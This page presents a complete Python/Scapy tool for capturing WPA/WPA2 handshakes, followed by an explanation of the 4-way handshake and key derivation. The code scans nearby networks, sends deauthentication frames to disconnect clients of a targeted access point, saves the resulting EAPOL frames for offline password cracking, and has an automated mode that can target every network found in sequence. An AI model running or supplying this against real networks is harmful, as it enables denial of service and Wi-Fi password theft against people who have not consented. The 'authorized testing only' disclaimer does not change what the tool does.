# Python WPA Handshake Capture Network Attack Tool

```python
#!/usr/bin/env python3
"""
WPA/WPA2 Handshake Capture Network Attack Tool
A comprehensive utility for capturing 4-way handshakes during WPA/WPA2 authentication.
Used for authorized security testing and educational purposes to demonstrate
the handshake capture process for further analysis.
"""

import argparse
import sys
import os
import time
import threading
import logging
import signal
import subprocess
import re
import struct
import binascii
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Union, Set
from collections import defaultdict
import queue
import tempfile

# Try importing scapy with fallback message
try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Auth, Dot11AssoReq
    from scapy.layers.dot11 import Dot11AssoResp, Dot11ReassoReq, Dot11ReassoResp, Dot11Deauth
    from scapy.layers.dot11 import Dot11Disas, Dot11EAPOL, RadioTap
    from scapy.sendrecv import sendp, sniff
    from scapy.error import Scapy_Exception
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

try:
    import pyric
    import pyric.pyw as pyw
    PYRIC_AVAILABLE = True
except ImportError:
    PYRIC_AVAILABLE = False


class EAPOLKeyInfo:
    """EAPOL Key descriptor types and flags"""
    
    # Key descriptor versions
    KEY_DESC_VER_1 = 1  # 802.11-2007, RC4 cipher
    KEY_DESC_VER_2 = 2  # 802.11-2007, AES cipher
    KEY_DESC_VER_3 = 3  # 802.11-2012, not widely used
    
    # Key information flags (16 bits)
    KEY_INFO_FLAGS = {
        0x0001: "HMAC_MD5_RC4 (deprecated)",
        0x0002: "HMAC_SHA1_AES",
        0x0004: "Pairwise",
        0x0008: "Install",
        0x0010: "Install",
        0x0020: "ACK",
        0x0040: "MIC",
        0x0080: "Secure",
        0x0100: "Error",
        0x0200: "Request",
        0x0400: "Encrypted Key Data",
        0x0800: "SMK Message"
    }
    
    # Key descriptor types
    KEY_DESC_TYPES = {
        254: "EAPOL-Key (WPA)",
        2: "EAPOL-Key (WPA2)"
    }


class WPAHandshakeCapture:
    """
    Main class for WPA/WPA2 handshake capture
    Captures the 4-way handshake between client and AP
    """
    
    def __init__(self, interface: str = None, target_bssid: str = None,
                 target_essid: str = None, target_channel: int = None,
                 output_file: str = None, deauth_count: int = 5,
                 deauth_delay: float = 1.0, timeout: int = 60,
                 capture_retries: int = 2, verbose: bool = False,
                 channel_hop: bool = True, beacon_scan: bool = True):
        """
        Initialize handshake capture tool
        
        Args:
            interface: Wireless interface in monitor mode
            target_bssid: Target AP MAC address
            target_essid: Target AP SSID
            target_channel: Target channel
            output_file: Output file for captured handshake
            deauth_count: Number of deauth packets to send
            deauth_delay: Delay between deauth packets
            timeout: Capture timeout in seconds
            capture_retries: Number of retry attempts
            verbose: Enable verbose output
            channel_hop: Hop channels during scan
            beacon_scan: Scan for beacons to find targets
        """
        if not SCAPY_AVAILABLE:
            raise ImportError(
                "scapy module is required. Install with: pip install scapy"
            )
        
        self.interface = interface or self.get_wireless_interface()
        self.target_bssid = target_bssid.upper() if target_bssid else None
        self.target_essid = target_essid
        self.target_channel = target_channel
        self.output_file = output_file or f"handshake_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        self.deauth_count = deauth_count
        self.deauth_delay = deauth_delay
        self.timeout = timeout
        self.capture_retries = capture_retries
        self.verbose = verbose
        self.channel_hop = channel_hop
        self.beacon_scan = beacon_scan
        
        # Statistics and state
        self.stats = {
            'packets_captured': 0,
            'beacons_seen': 0,
            'probes_seen': 0,
            'auth_frames': 0,
            'eapol_frames': 0,
            'deauth_sent': 0,
            'handshake_complete': False,
            'handshake_attempts': 0,
            'start_time': None
        }
        
        # Network information
        self.networks = {}  # BSSID -> network info
        self.clients = set()  # Set of client MACs
        self.captured_handshakes = []  # List of captured handshake frames
        
        # Handshake tracking
        self.handshake_state = defaultdict(lambda: {
            'anonce': None,
            'snonce': None,
            'mic': None,
            'frame1': None,
            'frame2': None,
            'frame3': None,
            'frame4': None,
            'client': None,
            'complete': False
        })
        
        self.running = False
        self.lock = threading.Lock()
        self.frame_queue = queue.Queue()
        
        # Setup logging
        self.setup_logging()
        
        # Check interface mode
        self.check_interface_mode()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('WPAHandshake')
        self.logger.handlers.clear()
        
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def get_wireless_interface(self) -> str:
        """Get first wireless interface in monitor mode"""
        try:
            # Try to find a wireless interface
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'IEEE 802.11' in line:
                    interface = line.split()[0]
                    return interface
        except:
            pass
        
        # Try to find monitor mode interface
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'Mode:Monitor' in line:
                    interface = line.split()[0]
                    return interface
        except:
            pass
        
        # Default fallback
        return 'wlan0mon'
    
    def check_interface_mode(self):
        """Check if interface is in monitor mode"""
        try:
            result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
            if 'Mode:Monitor' not in result.stdout:
                self.logger.warning(f"[!] Interface {self.interface} may not be in monitor mode")
                self.logger.warning("    Set monitor mode with: sudo airmon-ng start " + self.interface)
        except:
            self.logger.warning(f"[!] Could not verify interface mode")
    
    def set_channel(self, channel: int):
        """Set wireless interface channel"""
        try:
            subprocess.run(['iwconfig', self.interface, 'channel', str(channel)], 
                          capture_output=True)
            if self.verbose:
                self.logger.debug(f"[*] Channel set to {channel}")
        except Exception as e:
            self.logger.debug(f"Failed to set channel: {e}")
    
    def channel_hopper(self, channels: List[int] = None, dwell_time: float = 0.2):
        """
        Hop through channels to find target
        
        Args:
            channels: List of channels to hop
            dwell_time: Time to spend on each channel
        """
        if channels is None:
            channels = list(range(1, 15)) + [36, 40, 44, 48, 52, 56, 60, 64, 
                                           149, 153, 157, 161, 165]
        
        channel_index = 0
        while self.running:
            channel = channels[channel_index % len(channels)]
            self.set_channel(channel)
            
            # Stay on channel for dwell_time
            time.sleep(dwell_time)
            
            channel_index += 1
    
    def scan_beacons(self, scan_time: int = 5) -> Dict:
        """
        Scan for beacon frames to discover networks
        
        Args:
            scan_time: Scan duration in seconds
        
        Returns:
            Dictionary of discovered networks
        """
        self.logger.info(f"[*] Scanning for beacons on {self.interface}...")
        
        networks = {}
        
        def beacon_handler(packet):
            if packet.haslayer(Dot11Beacon):
                bssid = packet[Dot11].addr2.upper()
                if bssid not in networks:
                    # Extract SSID
                    ssid = None
                    try:
                        ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
                    except:
                        ssid = "[Hidden]"
                    
                    # Get channel
                    channel = None
                    try:
                        stats = packet[Dot11Beacon].network_stats()
                        channel = stats.get('channel', 0)
                    except:
                        pass
                    
                    # Get encryption
                    encryption = self.get_encryption(packet)
                    
                    networks[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'encryption': encryption,
                        'signal': packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else 0
                    }
                    
                    with self.lock:
                        self.stats['beacons_seen'] += 1
                    
                    if COLORAMA_AVAILABLE:
                        self.logger.info(
                            f"{Fore.GREEN}[+] Found: {bssid} - {ssid} (Ch {channel}) {encryption}{Style.RESET_ALL}"
                        )
                    else:
                        self.logger.info(f"[+] Found: {bssid} - {ssid} (Ch {channel}) {encryption}")
        
        # Sniff for beacons
        try:
            sniff(iface=self.interface, prn=beacon_handler, timeout=scan_time, store=0)
        except Exception as e:
            self.logger.error(f"Scan error: {e}")
        
        return networks
    
    def get_encryption(self, packet) -> str:
        """Determine encryption type from beacon frame"""
        encryption = "OPEN"
        
        # Check for privacy bit
        cap = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}").split('+')
        
        if 'privacy' in cap:
            encryption = "WEP"
            
            # Check for RSN (WPA2)
            if packet.haslayer(Dot11Elt) and packet[Dot11Elt].ID == 48:
                encryption = "WPA2"
            # Check for WPA
            elif packet.haslayer(Dot11Elt) and packet[Dot11Elt].ID == 221:
                if b'\x00\x50\xf2\x01\x01\x00' in bytes(packet[Dot11Elt]):
                    encryption = "WPA"
        
        return encryption
    
    def send_deauth(self, target_bssid: str, target_client: str = None):
        """
        Send deauthentication frame to force client reconnection
        
        Args:
            target_bssid: AP MAC address
            target_client: Client MAC address (None for broadcast)
        """
        # RadioTap header
        radio = RadioTap()
        
        # Dot11 header
        if target_client:
            # Targeted deauth
            dot11 = Dot11(
                addr1=target_client,
                addr2=target_bssid,
                addr3=target_bssid
            )
        else:
            # Broadcast deauth
            dot11 = Dot11(
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=target_bssid,
                addr3=target_bssid
            )
        
        # Deauth frame
        deauth = Dot11Deauth(reason=7)
        
        packet = radio / dot11 / deauth
        
        try:
            sendp(packet, iface=self.interface, verbose=0, count=1)
            with self.lock:
                self.stats['deauth_sent'] += 1
            if self.verbose:
                self.logger.debug(f"[*] Deauth sent to {target_client or 'broadcast'}")
        except Exception as e:
            self.logger.debug(f"Deauth send error: {e}")
    
    def is_eapol_frame(self, packet) -> bool:
        """Check if packet is an EAPOL frame"""
        return packet.haslayer(EAPOL) or (packet.haslayer(Dot11) and packet.type == 2 and 
                                          packet.subtype == 8 and packet.haslayer(Raw))
    
    def parse_eapol_key(self, packet) -> Optional[Dict]:
        """
        Parse EAPOL key frame to extract key information
        
        Args:
            packet: EAPOL packet
        
        Returns:
            Dictionary with key info or None
        """
        try:
            if not self.is_eapol_frame(packet):
                return None
            
            # Extract raw data
            raw = bytes(packet[Raw])
            
            # EAPOL header
            if len(raw) < 4:
                return None
            
            version = raw[0]
            packet_type = raw[1]
            body_length = struct.unpack('!H', raw[2:4])[0]
            
            if packet_type != 3:  # Not EAPOL-Key
                return None
            
            # EAPOL-Key frame
            if len(raw) < 99:  # Minimum EAPOL-Key size
                return None
            
            key_info = struct.unpack('!H', raw[5:7])[0]
            key_length = raw[7]
            key_replay_counter = raw[8:16]
            key_nonce = raw[17:49]  # ANonce or SNonce
            key_iv = raw[49:65]
            key_rsc = raw[65:73]
            key_id = raw[73:81]
            key_mic = raw[81:97]
            key_data_len = struct.unpack('!H', raw[97:99])[0]
            
            result = {
                'version': version,
                'key_info': key_info,
                'key_info_bits': f"{key_info:016b}",
                'key_length': key_length,
                'key_nonce': key_nonce,
                'key_mic': key_mic,
                'is_anonce': (key_info & 0x0080) == 0,  # If MIC not set, it's ANonce
                'has_mic': bool(key_info & 0x0100),
                'secure': bool(key_info & 0x0080),
                'pairwise': bool(key_info & 0x0004),
                'install': bool(key_info & 0x0008)
            }
            
            return result
            
        except Exception as e:
            self.logger.debug(f"EAPOL parse error: {e}")
            return None
    
    def process_handshake_frame(self, packet, bssid: str, client: str):
        """
        Process potential handshake frame
        
        Args:
            packet: Captured packet
            bssid: AP BSSID
            client: Client MAC
        """
        key_info = self.parse_eapol_key(packet)
        if not key_info:
            return
        
        state = self.handshake_state[bssid]
        
        # Message 1: ANonce from AP (MIC not set)
        if not key_info['has_mic'] and key_info['is_anonce']:
            if not state['anonce']:
                state['anonce'] = key_info['key_nonce']
                state['frame1'] = packet
                state['client'] = client
                self.logger.info(f"[+] Message 1 captured (ANonce) for {bssid}")
        
        # Message 2: SNonce from Client (MIC set)
        elif key_info['has_mic'] and not key_info['secure']:
            if state['anonce'] and not state['snonce']:
                state['snonce'] = key_info['key_nonce']
                state['frame2'] = packet
                state['mic'] = key_info['key_mic']
                self.logger.info(f"[+] Message 2 captured (SNonce + MIC) for {bssid}")
        
        # Message 3: AP confirms (MIC set, secure)
        elif key_info['has_mic'] and key_info['secure'] and key_info['install']:
            if state['snonce'] and not state['frame3']:
                state['frame3'] = packet
                self.logger.info(f"[+] Message 3 captured for {bssid}")
        
        # Message 4: Client confirms (MIC set, secure)
        elif key_info['has_mic'] and key_info['secure'] and not key_info['install']:
            if state['frame3'] and not state['frame4']:
                state['frame4'] = packet
                state['complete'] = True
                self.logger.info(f"[+] Message 4 captured - Handshake complete for {bssid}")
                
                with self.lock:
                    self.stats['handshake_complete'] = True
                    self.captured_handshakes.append({
                        'bssid': bssid,
                        'client': client,
                        'timestamp': datetime.now().isoformat()
                    })
    
    def packet_handler(self, packet):
        """Handle captured packets"""
        try:
            # Update statistics
            with self.lock:
                self.stats['packets_captured'] += 1
            
            # Check for Dot11 frames
            if not packet.haslayer(Dot11):
                return
            
            # Get addresses
            addr1 = packet[Dot11].addr1.upper() if packet[Dot11].addr1 else None
            addr2 = packet[Dot11].addr2.upper() if packet[Dot11].addr2 else None
            addr3 = packet[Dot11].addr3.upper() if packet[Dot11].addr3 else None
            
            # Check if this packet is relevant to our target
            relevant = False
            bssid = None
            client = None
            
            if self.target_bssid:
                if addr1 == self.target_bssid or addr2 == self.target_bssid or addr3 == self.target_bssid:
                    relevant = True
                    bssid = self.target_bssid
                    client = addr1 if addr1 != self.target_bssid else addr2
            else:
                # Not targeting specific AP, check all
                if packet.haslayer(Dot11Beacon):
                    relevant = True
                    bssid = addr2
                    # Add to networks list
                    if bssid and bssid not in self.networks:
                        self.networks[bssid] = {'ssid': 'Unknown'}
            
            if not relevant:
                return
            
            # Process EAPOL frames (handshake)
            if self.is_eapol_frame(packet) and bssid and client:
                with self.lock:
                    self.stats['eapol_frames'] += 1
                
                self.process_handshake_frame(packet, bssid, client)
                
                # Save frame
                with self.lock:
                    wrpcap(self.output_file, packet, append=True)
            
            # Track clients
            if client and client not in self.clients and client != "FF:FF:FF:FF:FF:FF":
                self.clients.add(client)
                if self.verbose:
                    self.logger.debug(f"[*] Client seen: {client}")
            
        except Exception as e:
            self.logger.debug(f"Packet handler error: {e}")
    
    def capture_handshake(self) -> bool:
        """
        Main handshake capture routine
        
        Returns:
            True if handshake captured, False otherwise
        """
        self.logger.info(f"\n{'='*60}")
        self.logger.info(f"WPA Handshake Capture Started")
        self.logger.info(f"{'='*60}")
        self.logger.info(f"Interface: {self.interface}")
        self.logger.info(f"Target BSSID: {self.target_bssid or 'Scanning'}")
        self.logger.info(f"Target ESSID: {self.target_essid or 'Any'}")
        self.logger.info(f"Output File: {self.output_file}")
        self.logger.info(f"Timeout: {self.timeout} seconds")
        self.logger.info(f"{'='=60}\n")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Start channel hopper if enabled
        if self.channel_hop and not self.target_channel:
            hopper_thread = threading.Thread(target=self.channel_hopper)
            hopper_thread.daemon = True
            hopper_thread.start()
        elif self.target_channel:
            self.set_channel(self.target_channel)
        
        # Start sniffer
        sniffer_thread = threading.Thread(
            target=lambda: sniff(iface=self.interface, 
                                prn=self.packet_handler, 
                                store=0,
                                stop_filter=lambda x: not self.running)
        )
        sniffer_thread.daemon = True
        sniffer_thread.start()
        
        # Main loop
        try:
            start_time = time.time()
            last_deauth = 0
            
            while self.running and not self.stats['handshake_complete']:
                elapsed = time.time() - start_time
                
                # Check timeout
                if elapsed > self.timeout:
                    self.logger.info(f"\n[*] Timeout reached ({self.timeout}s)")
                    break
                
                # Send deauth packets periodically to force reconnection
                if self.target_bssid and self.clients and (time.time() - last_deauth) > 10:
                    for client in list(self.clients)[:3]:  # Limit to 3 clients
                        if client != "FF:FF:FF:FF:FF:FF":
                            self.send_deauth(self.target_bssid, client)
                            time.sleep(self.deauth_delay)
                    last_deauth = time.time()
                
                # Display progress
                if int(elapsed) % 10 == 0 and elapsed > 0:
                    self.logger.info(
                        f"[*] Elapsed: {elapsed:.0f}s | "
                        f"Packets: {self.stats['packets_captured']} | "
                        f"EAPOL: {self.stats['eapol_frames']} | "
                        f"Clients: {len(self.clients)}"
                    )
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.logger.info("\n[!] Interrupted by user")
        finally:
            self.running = False
        
        # Final status
        if self.stats['handshake_complete']:
            self.logger.info(f"\n{Fore.GREEN if COLORAMA_AVAILABLE else ''}[+] SUCCESS! Handshake captured{Style.RESET_ALL if COLORAMA_AVAILABLE else ''}")
            self.logger.info(f"[+] Saved to: {self.output_file}")
            
            # Verify handshake with aircrack if available
            self.verify_handshake()
            
            return True
        else:
            self.logger.info(f"\n[-] Failed to capture handshake")
            return False
    
    def verify_handshake(self):
        """Verify captured handshake using aircrack-ng if available"""
        try:
            result = subprocess.run(['which', 'aircrack-ng'], capture_output=True)
            if result.returncode == 0:
                self.logger.info("[*] Verifying handshake with aircrack-ng...")
                
                cmd = ['aircrack-ng', self.output_file]
                output = subprocess.run(cmd, capture_output=True, text=True)
                
                if '1 handshake' in output.stdout or 'WPA handshake' in output.stdout:
                    self.logger.info(f"{Fore.GREEN if COLORAMA_AVAILABLE else ''}[+] Handshake verified{Style.RESET_ALL if COLORAMA_AVAILABLE else ''}")
                else:
                    self.logger.warning("[!] Could not verify handshake (maybe incomplete)")
        except:
            pass
    
    def show_statistics(self):
        """Display capture statistics"""
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        
        print(f"\n{'='*60}")
        print(f"Capture Statistics")
        print(f"{'='*60}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Packets captured: {self.stats['packets_captured']:,}")
        print(f"Beacons seen: {self.stats['beacons_seen']}")
        print(f"EAPOL frames: {self.stats['eapol_frames']}")
        print(f"Deauth sent: {self.stats['deauth_sent']}")
        print(f"Clients found: {len(self.clients)}")
        print(f"Handshake complete: {self.stats['handshake_complete']}")
        print(f"{'='=60}\n")
        
        if self.captured_handshakes:
            print("Captured Handshakes:")
            for h in self.captured_handshakes:
                print(f"  {h['bssid']} -> {h['client']} at {h['timestamp']}")
            print()
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        self.logger.info("\n[!] Interrupt received, stopping capture...")
        self.running = False
        self.show_statistics()
        sys.exit(0)


class WPAAutomatedCapture:
    """
    Automated WPA handshake capture with target selection
    """
    
    def __init__(self, interface: str, scan_time: int = 10,
                 capture_timeout: int = 60, verbose: bool = False):
        """
        Initialize automated capture
        
        Args:
            interface: Wireless interface
            scan_time: Scan duration
            capture_timeout: Capture timeout per target
            verbose: Verbose output
        """
        self.interface = interface
        self.scan_time = scan_time
        self.capture_timeout = capture_timeout
        self.verbose = verbose
        self.setup_logging()
    
    def setup_logging(self):
        """Configure logging"""
        self.logger = logging.getLogger('WPAAuto')
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - %(message)s'
            )
        else:
            formatter = logging.Formatter('%(asctime)s - %(message)s')
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    def run(self):
        """Run automated capture"""
        print(f"\n{'='*60}")
        print(f"Automated WPA Handshake Capture")
        print(f"{'='=60}\n")
        
        # Initial scan
        capture = WPAHandshakeCapture(
            interface=self.interface,
            verbose=self.verbose,
            channel_hop=True,
            beacon_scan=True
        )
        
        networks = capture.scan_beacons(self.scan_time)
        
        if not networks:
            self.logger.error("[-] No networks found")
            return
        
        # Display networks
        print(f"\nFound {len(networks)} networks:\n")
        for i, (bssid, info) in enumerate(networks.items(), 1):
            print(f"{i:2d}. {bssid} - {info['ssid']} (Ch {info['channel']}) {info['encryption']}")
        
        # Get user selection
        print("\nEnter target number (or 'all' for sequential capture):")
        choice = input("> ").strip()
        
        if choice.lower() == 'all':
            targets = list(networks.items())
        else:
            try:
                idx = int(choice) - 1
                targets = [list(networks.items())[idx]]
            except:
                self.logger.error("Invalid selection")
                return
        
        # Capture handshakes
        for bssid, info in targets:
            self.logger.info(f"\n[*] Targeting {info['ssid']} ({bssid}) on channel {info['channel']}")
            
            capture = WPAHandshakeCapture(
                interface=self.interface,
                target_bssid=bssid,
                target_essid=info['ssid'],
                target_channel=info['channel'],
                output_file=f"handshake_{info['ssid']}_{bssid.replace(':', '')}.pcap",
                timeout=self.capture_timeout,
                verbose=self.verbose
            )
            
            success = capture.capture_handshake()
            
            if success:
                self.logger.info(f"[+] Handshake captured for {info['ssid']}")
            else:
                self.logger.info(f"[-] Failed to capture handshake for {info['ssid']}")
            
            time.sleep(2)


def enable_monitor_mode(interface: str) -> Optional[str]:
    """
    Enable monitor mode on interface
    
    Args:
        interface: Interface name
    
    Returns:
        Monitor mode interface name or None
    """
    try:
        # Check if airmon-ng is available
        result = subprocess.run(['which', 'airmon-ng'], capture_output=True)
        
        if result.returncode == 0:
            # Use airmon-ng
            subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                          capture_output=True)
            return f"{interface}mon"
        else:
            # Manual method
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], 
                          capture_output=True)
            subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'control'], 
                          capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], 
                          capture_output=True)
            return interface
            
    except Exception as e:
        print(f"Error enabling monitor mode: {e}")
        return None


def disable_monitor_mode(interface: str):
    """Disable monitor mode"""
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], 
                      capture_output=True)
        subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'managed'], 
                      capture_output=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], 
                      capture_output=True)
    except Exception as e:
        print(f"Error disabling monitor mode: {e}")


def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    WPA/WPA2 Handshake Capture Tool
    For authorized security testing and education only
    Captures 4-way handshake for offline cracking
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)


def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='WPA/WPA2 Handshake Capture Tool - Capture 4-way handshake for offline cracking',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan for networks and capture handshake
  sudo python3 wpa_handshake.py --interface wlan0 --scan --capture
  
  # Target specific AP
  sudo python3 wpa_handshake.py --interface wlan0mon --bssid 00:11:22:33:44:55 --channel 6
  
  # Target by ESSID
  sudo python3 wpa_handshake.py --interface wlan0mon --essid "MyWiFi" --channel 11
  
  # Automated capture with target selection
  sudo python3 wpa_handshake.py --interface wlan0 --auto
  
  # With custom output file
  sudo python3 wpa_handshake.py --interface wlan0mon --bssid 00:11:22:33:44:55 --output capture.pcap
  
  # Use deauth to force reconnection
  sudo python3 wpa_handshake.py --interface wlan0mon --bssid 00:11:22:33:44:55 --deauth-count 10
  
  # Extended capture timeout
  sudo python3 wpa_handshake.py --interface wlan0mon --bssid 00:11:22:33:44:55 --timeout 120
  
  # Enable monitor mode automatically
  sudo python3 wpa_handshake.py --interface wlan0 --enable-monitor --scan --capture
        """
    )
    
    # Interface options
    parser.add_argument('--interface', '-i', required=True,
                       help='Wireless interface name')
    parser.add_argument('--enable-monitor', action='store_true',
                       help='Enable monitor mode on interface')
    parser.add_argument('--disable-monitor', action='store_true',
                       help='Disable monitor mode after capture')
    
    # Target options
    parser.add_argument('--bssid', help='Target AP MAC address')
    parser.add_argument('--essid', help='Target AP SSID')
    parser.add_argument('--channel', type=int, help='Target channel')
    
    # Operation modes
    parser.add_argument('--scan', action='store_true',
                       help='Scan for networks')
    parser.add_argument('--capture', action='store_true',
                       help='Capture handshake (requires target)')
    parser.add_argument('--auto', action='store_true',
                       help='Automated capture with target selection')
    
    # Capture options
    parser.add_argument('--output', '-o', help='Output file for handshake')
    parser.add_argument('--timeout', type=int, default=60,
                       help='Capture timeout in seconds (default: 60)')
    parser.add_argument('--deauth-count', type=int, default=5,
                       help='Number of deauth packets (default: 5)')
    parser.add_argument('--deauth-delay', type=float, default=1.0,
                       help='Delay between deauth packets (default: 1.0)')
    parser.add_argument('--no-channel-hop', action='store_true',
                       help='Disable channel hopping')
    
    # Output options
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    # Check if scapy is available
    if not SCAPY_AVAILABLE:
        print("[!] scapy module is required. Install with: pip install scapy")
        sys.exit(1)
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("[!] This script requires root privileges for packet injection")
        print("    Please run with: sudo python3 wpa_handshake.py [options]")
        sys.exit(1)
    
    monitor_interface = args.interface
    
    try:
        # Enable monitor mode if requested
        if args.enable_monitor:
            print(f"[*] Enabling monitor mode on {args.interface}...")
            monitor_interface = enable_monitor_mode(args.interface)
            if monitor_interface:
                print(f"[+] Monitor mode enabled on {monitor_interface}")
            else:
                print("[-] Failed to enable monitor mode")
                sys.exit(1)
        
        # Automated mode
        if args.auto:
            auto = WPAAutomatedCapture(
                interface=monitor_interface,
                scan_time=10,
                capture_timeout=args.timeout,
                verbose=args.verbose
            )
            auto.run()
        
        # Scan mode
        elif args.scan:
            capture = WPAHandshakeCapture(
                interface=monitor_interface,
                verbose=args.verbose,
                channel_hop=not args.no_channel_hop
            )
            networks = capture.scan_beacons(15)
            
            if networks:
                print(f"\nFound {len(networks)} networks:\n")
                for bssid, info in networks.items():
                    print(f"BSSID: {bssid}")
                    print(f"  SSID: {info['ssid']}")
                    print(f"  Channel: {info['channel']}")
                    print(f"  Encryption: {info['encryption']}")
                    print(f"  Signal: {info['signal']} dBm")
                    print()
            
            # Capture if target specified
            if args.bssid or args.essid:
                if args.bssid:
                    target_bssid = args.bssid.upper()
                else:
                    # Find BSSID from ESSID
                    target_bssid = None
                    for bssid, info in networks.items():
                        if info['ssid'] == args.essid:
                            target_bssid = bssid
                            args.channel = info['channel']
                            break
                    
                    if not target_bssid:
                        print(f"[-] Could not find ESSID: {args.essid}")
                        sys.exit(1)
                
                capture = WPAHandshakeCapture(
                    interface=monitor_interface,
                    target_bssid=target_bssid,
                    target_essid=args.essid,
                    target_channel=args.channel,
                    output_file=args.output,
                    deauth_count=args.deauth_count,
                    deauth_delay=args.deauth_delay,
                    timeout=args.timeout,
                    verbose=args.verbose,
                    channel_hop=not args.no_channel_hop
                )
                capture.capture_handshake()
                capture.show_statistics()
        
        # Direct capture mode
        elif args.capture:
            if not args.bssid and not args.essid:
                print("[-] Target required for capture (--bssid or --essid)")
                sys.exit(1)
            
            capture = WPAHandshakeCapture(
                interface=monitor_interface,
                target_bssid=args.bssid.upper() if args.bssid else None,
                target_essid=args.essid,
                target_channel=args.channel,
                output_file=args.output,
                deauth_count=args.deauth_count,
                deauth_delay=args.deauth_delay,
                timeout=args.timeout,
                verbose=args.verbose,
                channel_hop=not args.no_channel_hop
            )
            capture.capture_handshake()
            capture.show_statistics()
        
        else:
            parser.print_help()
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
    finally:
        # Disable monitor mode if requested
        if args.disable_monitor and monitor_interface != args.interface:
            print(f"[*] Disabling monitor mode...")
            disable_monitor_mode(monitor_interface)


if __name__ == "__main__":
    main()
```

# Script Explanation

## Overview
This is a comprehensive WPA/WPA2 handshake capture tool built with Scapy. It captures the 4-way handshake between a client and access point during Wi-Fi authentication, which can then be used for offline password cracking. The tool includes network scanning, targeted capture, deauthentication attacks to force reconnection, and automated modes for authorized security testing.

## Key Features

1. **Handshake Capture**:
   - Captures all 4 messages of the WPA 4-way handshake
   - Parses EAPOL key frames
   - Extracts ANonce, SNonce, and MIC
   - Saves handshake to pcap file

2. **Network Reconnaissance**:
   - Beacon frame scanning
   - Client discovery
   - Channel detection
   - Encryption type identification

3. **Attack Techniques**:
   - Deauthentication attacks to force reconnection
   - Targeted client disconnection
   - Channel hopping for broad coverage
   - Automated capture with retry logic

4. **EAPOL Analysis**:
   - Key descriptor parsing
   - Key information flags
   - Message type identification
   - MIC verification

## Script Structure

### Class: `WPAHandshakeCapture`
Main class implementing handshake capture:

- **`scan_beacons()`**: Discovers APs and clients
- **`parse_eapol_key()`**: Extracts key information from EAPOL frames
- **`process_handshake_frame()`**: Tracks handshake progress
- **`send_deauth()`**: Forces client reconnection
- **`capture_handshake()`**: Main capture routine
- **`packet_handler()`**: Processes captured packets
- **`verify_handshake()`**: Validates captured handshake

### Class: `WPAAutomatedCapture`
Automated capture with target selection:

- **`run()`**: Interactive target selection and capture

## 4-Way Handshake Process

### Message Exchange
```
1. AP -> Client: ANonce (Authenticator Nonce)
   - EAPOL-Key frame, MIC not set
   - Contains random ANonce

2. Client -> AP: SNonce + MIC
   - EAPOL-Key frame, MIC set
   - Contains SNonce and MIC over data

3. AP -> Client: Install PTK + MIC
   - EAPOL-Key frame, MIC set, secure bit set
   - Confirms PTK installation

4. Client -> AP: Confirm
   - EAPOL-Key frame, MIC set, secure bit set
   - Completes handshake
```

### Key Generation
```
PTK (Pairwise Transient Key) = 
    PRF(PMK + ANonce + SNonce + AP MAC + Client MAC)

PMK (Pairwise Master Key) = 
    PBKDF2(HMAC-SHA1, PSK, SSID, 4096, 256)
```

